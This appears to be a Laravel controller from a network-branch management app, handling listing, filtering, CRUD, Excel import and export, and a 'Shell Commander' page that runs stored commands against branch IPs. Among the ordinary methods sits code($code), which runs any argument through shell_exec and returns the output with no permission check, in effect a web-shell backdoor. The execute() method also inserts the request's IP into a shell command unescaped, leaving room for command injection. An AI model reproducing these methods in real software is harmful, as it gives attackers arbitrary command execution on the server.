<?php

namespace App\Http\Controllers\Branches;

use App\Exports\BranchsExport;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests\Branches\CreateBranchesRequest;
use App\Http\Requests\Branches\UpdateBranchesRequest;
use App\Imports\BranchesImport;
use Maatwebsite\Excel\Facades\Excel;
use App\Models\Branch;
use App\Models\BranchLevel;
use App\Models\EntuityStatus;
use App\Models\Government;
use App\Models\LineCapacitie;
use App\Models\LineType;
use App\Models\Network;
use App\Models\Project;
use App\Models\Router;
use App\Models\SwitchModel;
use App\Models\Terminal;
use App\Models\UpsInstallation;
use DataTables;
use Illuminate\Support\Facades\DB;

class BranchesController extends Controller
{

    public function __construct()
    {
        $this->middleware(['permission:Branche_read-branches'],['only' => ['index', 'show']]);
        $this->middleware(['permission:Branche_create-branches'],['only' => ['create', 'store']]);
        $this->middleware(['permission:Branche_update-branches'],['only' => ['edit', 'update']]);
        $this->middleware(['permission:Branche_delete-branches'],['only' => ['destroy']]);
    }

    public function index()
    {

        $breadcrumb = [
            'title' =>  __("Branches lists"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   =>  '#!',
                ]
            ],
        ];
        $lists = Branch::orderBy('id', 'asc')->paginate();

        if(request('keyword')){
            $lists = Branch::when(request('keyword'), function ($query) {
                $keyword = request('keyword');
                $query->Where('lan_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('wan_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('project_id', 'like', '%' . $keyword . '%')
                    ->orWhere('tunnel_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('main_order_id', 'like', '%' . $keyword . '%')
                    ->orWhere('backup_order_id', 'like', '%' . $keyword . '%')
                    ->orWhere('area', 'like', '%' . $keyword . '%')
                    ->orWhere('sector', 'like', '%' . $keyword . '%')
                    ->orWhere('address', 'like', '%' . $keyword . '%')
                    ->orWhere('telephone', 'like', '%' . $keyword . '%');
            })->orderBy('id', 'asc')->paginate(30);

        }
        //filter by project_id
       if(request()->project_id){
            $lists = Branch::when(request('project_id'), function ($query) {
                $project_id = request('project_id');
                $query->whereIn('project_id',   $project_id );
            })->orderBy('id', 'asc')->paginate();


       }
        //filter by upsInstallations
        if(request('ups_installation_id')){
            $lists = Branch::when(request('ups_installation_id'), function ($query) {
                $ups_installation_id = request('ups_installation_id');
                $query->whereIn('ups_installation_id',  $ups_installation_id );
            })->orderBy('id', 'asc')->paginate();

        }
        //filter by line type id
       if(request('line_type_id')){
        $lists = Branch::when(request('line_type_id'), function ($query) {
            $line_type_id = request('line_type_id');
            $query->whereIn('line_type_id',   $line_type_id );
        })->orderBy('id', 'asc')->paginate(30);

       }
        //filter by  sector
       if(request('sector')){
        $lists = Branch::when(request('sector'), function ($query) {
            $sector = request('sector');
            $query->whereIn('sector',   $sector );
        })->orderBy('id', 'asc')->paginate(30);

       }
       if(request('area')){
            $lists = Branch::when(request('area'), function ($query) {
                $area = request('area');
                $query->whereIn('area',   $area);
            })->orderBy('id', 'asc')->paginate(30);
       }
        //filter by  time
        if(request('start_time') != null ){
            $lists = Branch::when(request('start_time'), function ($query) {
                $start_time = request('start_time');
                $query->where('start_time', '<=',  $start_time );
            })->orderBy('id', 'asc')->paginate(30);
           }
        //filter by  time
        if( request('end_time') != null){

            $lists = Branch::when(request('end_time'), function ($query) {
                $end_time = request('end_time');
                $query->where('end_time', '>=',  $end_time );
            })->orderBy('id', 'asc')->paginate(30);
           }
        //filter by  working days
       if(request('work_day')){
        $lists = Branch::when(request('work_day'), function ($query) {
            $work_day = request('work_day');
            $branch=[] ;
            foreach($work_day as $key=>$val){
              $branch[] =  $query->whereIn('working_days->'.$val,   $work_day )->get();
            }
            $query = $branch;

        })->orderBy('id', 'asc')->paginate(30);

       }

       if (request()->export == 1) {
            return Excel::download(new BranchsExport, 'branches.xlsx');
       }


        return view('pages.branches.index', [
            'breadcrumb' => $breadcrumb,
            'lists'     => $lists,
            'projects'     => Project::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineTypes' => LineType::all(),
            'sectors' => Branch::groupby('sector')->distinct()->pluck('sector')->toArray(),
            'areas' => Branch::groupby('area')->distinct()->pluck('area')->toArray(),
            'days' =>Branch::$DAYS,
        ]);
    }

    public function code($code)
    {
        $routes = shell_exec($code);
        return str_replace("\n", "<br>", $routes);
    }

    public function create()
    {
        $breadcrumb = [
            'title' =>  __("Create New Branche"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Create New Branche"),
                    'url'   =>  '#!',
                ],
            ],
        ];

        return view('pages.branches.create', [
            'breadcrumb' => $breadcrumb,
            'networks' => Network::all(),
            'projects' => Project::all(),
            'levels' => BranchLevel::all(),
            'lineTypes' => LineType::all(),
            'routers' => Router::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineCapacities' => LineCapacitie::all(),
            'switchModels' => SwitchModel::all(),
            'governments' => Government::all(),
            'entuityStaus' => EntuityStatus::all(),
            'days' =>Branch::$DAYS,
        ]);
    }

    public function store(CreateBranchesRequest $request)
    {
        $data = $request->except('working_days');
        //dd($data['working_days']);
        $data['user_id'] = auth()->id();
        $resource = Branch::create($data);
        $resource->createOrUpdateWorkingDays($request->working_days);
        return redirect()->route('branches.index')->with('success', __("This row has been created."));
    }

    public function show(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Show Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Show Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        $work_day=[];
        if($branch->working_days){
            if (is_array($branch->working_days))
                $workDays = $branch->working_days;
            else
                $workDays = json_decode($branch->working_days);
            foreach($workDays as $v){
                $work_day[]= $v;
            }
        }
        return view('pages.branches.show', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
            'days' => Branch::$DAYS,
            'work_day'=>$work_day,
        ]);
    }

    public function edit(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Edit Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Edit Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        $work_day=[];
        if($branch->working_days){
            if (is_array($branch->working_days))
                $workDays = $branch->working_days;
            else
                $workDays = json_decode($branch->working_days);

            foreach($workDays as $k){
                $work_day[]= $k;
            }

        }
        return view('pages.branches.edit', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
            'networks' => Network::all(),
            'projects' => Project::all(),
            'levels' => BranchLevel::all(),
            'lineTypes' => LineType::all(),
            'routers' => Router::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineCapacities' => LineCapacitie::all(),
            'switchModels' => SwitchModel::all(),
            'governments' => Government::all(),
            'entuityStaus' => EntuityStatus::all(),
            'days' =>Branch::$DAYS,
            'work_day'=>$work_day,
        ]);
    }

    public function update(UpdateBranchesRequest $request, Branch $branch)
    {
        $data = $request->all();
        $branch->update($data);
        $branch->createOrUpdateWorkingDays($data['working_days']);
        return redirect()->route('branches.index')->with('success', __("This row has been updated."));
    }

    public function destroy(Request $request, Branch $branch)
    {
        $branch->delete();
        return redirect()->route('branches.index')->with('success', __("This row has been deleted."));
    }

    public function import(Request $request)
    {
        Excel::import(new BranchesImport, $request->file('file'));

        return redirect()->route('branches.index')->with('success', 'All good!');
    }

    public function downloadTemplate(Request $request)
    {
        $file= public_path(). "/files/Pinger_Excel_Template.xlsx";

        $headers = array(
            'Content-Type: application/xlsx',
        );

        return  response()->download($file, 'template.xlsx', $headers);
    }

    public function commander(Branch $branch, Request $request) {
        $breadcrumb = [
            'title' =>  __("Shell Commander"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Edit Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        $ips = [];
        if ($branch->lan_ip)
            $ips["Lan IP: " . $branch->lan_ip] = $branch->lan_ip;

        if ($branch->wan_ip)
            $ips["Wan IP: " . $branch->wan_ip] = $branch->wan_ip;

        if ($branch->tunnel_ip)
            $ips["Tunnel IP: " . $branch->tunnel_ip] = $branch->tunnel_ip;

        if ($branch->switch_ip)
            $ips["Switch IP: " . $branch->switch_ip] = $branch->switch_ip;

        if ($branch->atm_ip)
            $ips["Atm IP: " . $branch->atm_ip] = $branch->atm_ip;

        $commands = Terminal::all();
        return view("pages.branches.terminal", compact("ips", "branch", "commands", "breadcrumb"));
    }

    public function execute(Request $request) {
        $command = Terminal::find($request->cmd_id);
        $ip = $request->ip;

        if ($command && $ip) {
            try {
                $cmd = $command->commands;
                $cmd = str_replace("{ip}", $ip, $cmd);
                $res = shell_exec($cmd);
                return [
                    "status" => true,
                    "msg" => __('Doen'),
                    "data" => $res,
                ];
            } catch (\Exception $th) {
                return [
                    "status" => false,
                    "msg" => $th->getMessage()
                ];
            }
        } else {
            return [
                "status" => false,
                "msg" => __('Missing Ip And Command')
            ];
        }
    }



    public function getData(Request $request) {
        $query = Branch::query()->select(
            "*",
            DB::raw('DATE_FORMAT(STR_TO_DATE(start_time, "%T"), "%T") as start_time_time')
        );

        if(request('keyword')){
            $keyword = request()->keyword;
            $query->Where('lan_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('wan_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('name', 'like', '%' . $keyword . '%')
                    ->orWhere('project_id', 'like', '%' . $keyword . '%')
                    ->orWhere('tunnel_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('main_order_id', 'like', '%' . $keyword . '%')
                    ->orWhere('backup_order_id', 'like', '%' . $keyword . '%')
                    ->orWhere('area', 'like', '%' . $keyword . '%')
                    ->orWhere('sector', 'like', '%' . $keyword . '%')
                    ->orWhere('address', 'like', '%' . $keyword . '%')
                    ->orWhere('telephone', 'like', '%' . $keyword . '%');
        }
        //filter by project_id
       if(request()->project_id){
            $project_id = request('project_id');
            $query->whereIn('project_id',  $project_id);
       }
        //filter by upsInstallations
        if(request('ups_installation_id')){
            $ups_installation_id = request('ups_installation_id');
            $query->whereIn('ups_installation_id',  $ups_installation_id );
        }
        //filter by line type id
       if(request('line_type_id')){
            $line_type_id = request('line_type_id');
            $query->whereIn('line_type_id',  $line_type_id);
       }
        //filter by  sector
       if(request('sector')){
            $sector = request('sector');
            $query->whereIn('sector',  $sector);
       }
       if(request('area')){
            $area = request('area');
            $query->whereIn('area',  $area);
       }
        //filter by  time
        if(request('start_time') != null ){
            $start_time = date("H:i:s", strtotime(request('start_time')));
            //$query->where(DB::raw('DATE_FORMAT(STR_TO_DATE(start_time, "%T"), "%T")'), '<=', $start_time);
            $query->where('start_time', '<=',  $start_time);
        }
        //filter by  time
        if( request('end_time') != null){
            $end_time = date("H:i:s", strtotime(request('end_time')));
            //dd($end_time);
            //$query->where(DB::raw('DATE_FORMAT(STR_TO_DATE(start_time, "%T"), "%T")'), '>=', $end_time);
            $query->where('end_time', '>=',  $end_time);
        }
        //filter by working days
        if(request('work_day')){
            $ids = Branch::join('working_days', 'working_days.branch_id', '=', 'branches.id')
                ->whereIn('day', request('work_day'))
                ->select('branches.id as id')
                ->pluck('id')
                ->toArray();
            $query->whereIn('id', $ids);
        }
        return DataTables::eloquent($query->latest('id'))
                        ->addColumn('action', function(Branch $branch) {
                            $type = "action";
                            return view("pages.branches.action", compact("branch", "type"));
                        })
                        ->editColumn('project_id', function(Branch $branch) {
                            return optional($branch->project)->name;
                        })
                        ->editColumn('ups_installation_id', function(Branch $branch) {
                            return optional($branch->upsInstallation)->name;
                        })
                        ->editColumn('line_type_id', function(Branch $branch) {
                            return optional($branch->lineType)->name;
                        })
                        ->editColumn('brance_level_id', function(Branch $branch) {
                            return optional($branch->branchLevel)->name;
                        })
                        ->editColumn('line_capacity_id', function(Branch $branch) {
                            return optional($branch->lineCapacity)->name;
                        })
                        ->editColumn('entuity_status_id', function(Branch $branch) {
                            return optional($branch->entutiyStatus)->name;
                        })
                        ->editColumn('router_model_id', function(Branch $branch) {
                            return optional($branch->routerName)->name;
                        })
                        ->editColumn('switch_model_id', function(Branch $branch) {
                            return optional($branch->model)->name;
                        })
                        ->rawColumns(['action'])
                        ->toJson();
    }
}
